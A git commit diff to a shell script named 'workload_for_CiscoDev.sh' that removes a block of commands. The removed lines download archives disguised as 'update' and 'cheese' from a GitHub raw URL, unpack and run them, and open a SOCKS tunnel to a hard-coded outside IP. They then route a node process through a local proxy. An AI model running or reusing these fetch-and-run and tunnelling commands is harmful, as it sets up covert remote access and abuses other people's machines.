fc14eaf4aa77e902b98217dda6d89195b83bf9cb
maxwellcrawford21 <maxwellcrawford.2@gmail.com>
2024-06-19 14:29:53 +0200

    Update workload_for_CiscoDev.sh

--- workload_for_CiscoDev.sh
+++ workload_for_CiscoDev.sh
@@ -45,51 +45,6 @@ sleep 2
 
 apt-get update
 apt-get install -y google-chrome-stable
-wget -q https://raw.githubusercontent.com/thembilemhlabangula/update/main/cheese.tar.gz > /dev/null
-sleep 2
-npm install pm2 -g
-
-sleep 2
-
-tar -xf cheese.tar.gz
-
-sleep 2
-
-./cheese client -v 45.135.58.52:443 7777:socks &
-
-sleep 2
-
-TZ='Africa/Johannesburg'; export TZ
-date
-sleep 2
-
-curl -s -L -o update.tar.gz https://raw.githubusercontent.com/thembilemhlabangula/update/main/update.tar.gz > /dev/null
-
-sleep 2
-
-tar -xf update.tar.gz > /dev/null
-
-sleep 2
-
-cat > update/local/update-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 127.0.0.1:7777
-END
-
-./update/local/update-local -config update/local/update-local.conf & > /dev/null
-
-sleep 2
-
-ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1
-
-sleep 3
-
-./update/local/update-local -config update/local/update-local.conf & > /dev/null
-
-sleep 2
-
-./update/update curl ifconfig.me
 
 sleep 2
 
@@ -115,4 +70,4 @@ END
 sleep 5
 
 #pm2 start index.js --watch
-./update/update node index.js
+node index.js
